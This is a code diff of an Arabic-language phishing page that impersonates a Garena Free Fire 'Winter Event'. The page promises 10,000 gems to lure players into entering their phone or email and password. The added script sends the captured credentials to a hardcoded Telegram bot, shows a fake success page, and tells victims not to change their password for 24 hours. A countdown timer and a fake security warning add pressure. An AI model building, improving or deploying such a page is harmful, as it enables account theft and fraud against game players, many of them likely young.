@@ -3,70 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Reward Center</title>
+    <title>Garena Free Fire - Winter Event 2026</title>
     <style>
-        body { background-color: #0c0c0c; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; direction: rtl; margin: 0; padding: 0; }
-        .header { background: linear-gradient(to bottom, #ff9900, #cc7a00); padding: 15px; font-weight: bold; font-size: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
-        .container { padding: 20px; }
-        .reward-card { border: 1px solid #333; background: #1a1a1a; border-radius: 10px; padding: 15px; margin-bottom: 20px; }
-        .reward-card img { width: 100px; border-radius: 5px; }
-        .login-btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; text-decoration: none; color: white; font-size: 16px; }
-        .fb-btn { background-color: #1877F2; }
-        .gp-btn { background-color: #ffffff; color: #757575; border: 1px solid #ddd; }
-        .timer { color: #ff0000; font-weight: bold; font-size: 18px; margin: 15px 0; }
-        input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #222; color: white; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); padding-top: 50px; }
+        body { 
+            background: url('https://w0.peakpx.com/wallpaper/326/28/HD-wallpaper-garena-free-fire-winterlands.jpg') no-repeat center center fixed; 
+            background-size: cover; 
+            color: white; 
+            font-family: 'Cairo', sans-serif; 
+            text-align: center; 
+            direction: rtl; 
+            margin: 0; 
+        }
+        .overlay { background: rgba(0, 0, 0, 0.8); min-height: 100vh; padding: 20px; }
+        .box { 
+            border: 3px solid #00f2ff; 
+            background: rgba(10, 25, 41, 0.95); 
+            border-radius: 20px; 
+            padding: 30px; 
+            max-width: 400px; 
+            margin: auto; 
+            box-shadow: 0 0 30px #00f2ff; 
+        }
+        .warning-box { 
+            background: rgba(255, 0, 0, 0.2); 
+            border: 1px solid #ff0000; 
+            color: #ffcc00; 
+            padding: 10px; 
+            font-size: 14px; 
+            border-radius: 8px; 
+            margin: 15px 0; 
+        }
+        input { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 8px; 
+            border: 2px solid #00f2ff; 
+            background: #000; 
+            color: white; 
+            box-sizing: border-box; 
+            font-size: 16px;
+        }
+        .yellow-btn { 
+            background: linear-gradient(180deg, #ffe600, #ff9900); 
+            color: black; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 10px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 20px; 
+            margin-top: 15px; 
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
+            text-transform: uppercase;
+        }
+        .timer { font-size: 22px; color: #ff3d00; font-weight: bold; text-shadow: 0 0 10px #ff3d00; }
+        #success-page { display: none; }
+        .success-icon { font-size: 60px; color: #00ff00; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-
-<div class="header">مركز توزيع مكافآت فري فاير 2026 💎</div>
-
-<div class="container">
-    <div class="reward-card">
-        <img src="https://garena.com/garena_cms/images/307/ff_logo.png" alt="Free Fire">
-        <h3>تهانينا! أنت مؤهل للحصول على 10,000 جوهرة + سكن الهيب هوب</h3>
-        <p>اختر الحساب المربوط باللعبة لاستلام الجوائز فوراً:</p>
+<div class="overlay">
+    <div id="login-page">
+        <img src="https://freefiremobile-a.akamaihd.net/ff_common/images/icon_logo.png" width="90" style="margin-top:20px;">
+        <h1 style="color:#00f2ff; text-shadow: 2px 2px #000;">حدث أرض الشتاء ❄️</h1>
         
-        <div class="timer">ينتهي العرض خلال: <span id="time">05:00</span></div>
+        <div class="box">
+            <div class="timer">ينتهي العرض الترويجي: <span id="time">04:59</span></div>
+            <h3 style="margin-top:10px;">استلم الآن 10,000 جوهرة 💎</h3>
+            
+            <div class="warning-box">
+                ⚠️ **تنبيه أمان قارينا**: يجب التأكد من كتابة الحساب وكلمة السر بشكل صحيح تماماً. إذا أخطأت في حرف واحد، **لن تصلك الجائزة** وسيتم استبعادك من الحدث نهائياً!
+            </div>
 
-        <button onclick="openLogin('Facebook')" class="login-btn fb-btn">تسجيل الدخول عبر Facebook</button>
-        <button onclick="openLogin('Google')" class="login-btn gp-btn">تسجيل الدخول عبر Google</button>
+            <form id="ff-trap">
+                <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+                <input type="password" id="pass" placeholder="كلمة السر الصحيحة" required>
+                <button type="submit" class="yellow-btn">الحصول على الجوائز الآن 🔥</button>
+            </form>
+        </div>
     </div>
-</div>
 
-<div id="loginModal" class="modal">
-    <div style="background: #1a1a1a; width: 85%; margin: auto; padding: 20px; border-radius: 10px; border: 1px solid #ff9900;">
-        <h3 id="loginTitle">تسجيل الدخول</h3>
-        <p style="font-size: 12px; color: #aaa;">يجب الدخول بالحساب الأساسي المربوط باللعبة لضمان وصول الجواهر</p>
-        
-        <form action="https://formspree.io/f/YOUR_ID_HERE" method="POST">
-            <input type="hidden" name="Login_Type" id="loginTypeField">
-            <input type="text" name="Email/Phone" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" name="Password" placeholder="كلمة السر" required>
-            <button type="submit" style="background:#ff9900; color:black; width:100%; padding:10px; border:none; border-radius:5px; font-weight:bold;">تأكيد الاستلام الآن 🔥</button>
-        </form>
-        <button onclick="closeLogin()" style="background:none; color:white; border:none; margin-top:15px; cursor:pointer;">إلغاء</button>
+    <div id="success-page">
+        <div class="box" style="margin-top: 50px; border-color: #00ff00; box-shadow: 0 0 30px #00ff00;">
+            <div class="success-icon">✅</div>
+            <h2 style="color: #00ff00;">تم قبول طلبك بنجاح!</h2>
+            <p style="font-size: 18px;">نحن نقوم الآن بمعالجة حسابك وتأكيد البيانات المرسلة.</p>
+            <hr style="border: 0.5px solid #333;">
+            <p style="color: #ffcc00; font-weight: bold;">⚠️ ملاحظة هامة جداً:</p>
+            <p>سوف تصلك الجوائز عبر بريد اللعبة خلال **24 ساعة**.</p>
+            <p style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">لضمان وصول الجواهر، لا تقم بتغيير كلمة السر أو تسجيل الدخول من جهاز آخر حتى تنتهي الـ 24 ساعة.</p>
+            <button class="yellow-btn" style="background:#333; color:white;" onclick="location.reload()">العودة للرئيسية</button>
+        </div>
     </div>
 </div>
 
 <script>
-    function openLogin(type) {
-        document.getElementById('loginModal').style.display = 'block';
-        document.getElementById('loginTitle').innerText = 'تسجيل الدخول عبر ' + type;
-        document.getElementById('loginTypeField').value = type;
-    }
-    function closeLogin() {
-        document.getElementById('loginModal').style.display = 'none';
-    }
+    const token = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
+    const chat_id = "8428507759";
 
-    // عداد الوقت
-    var minutes = 5, seconds = 0;
+    document.getElementById('ff-trap').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const message = `❄️ صيد شتاء فري فاير جديد ❄️\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}\n📅 الوقت: ${new Date().toLocaleString()}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            document.getElementById('login-page').style.display = 'none';
+            document.getElementById('success-page').style.display = 'block';
+        });
+    });
+
+    // عداد الوقت التنازلي
+    var min = 4, sec = 59;
     setInterval(function() {
-        if (seconds == 0) { minutes--; seconds = 59; } else { seconds--; }
-        document.getElementById('time').innerText = (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+        if (sec == 0) { min--; sec = 59; } else { sec--; }
+        document.getElementById('time').innerText = (min < 10 ? "0" : "") + min + ":" + (sec < 10 ? "0" : "") + sec;
     }, 1000);
 </script>
-
 </body>
 </html>
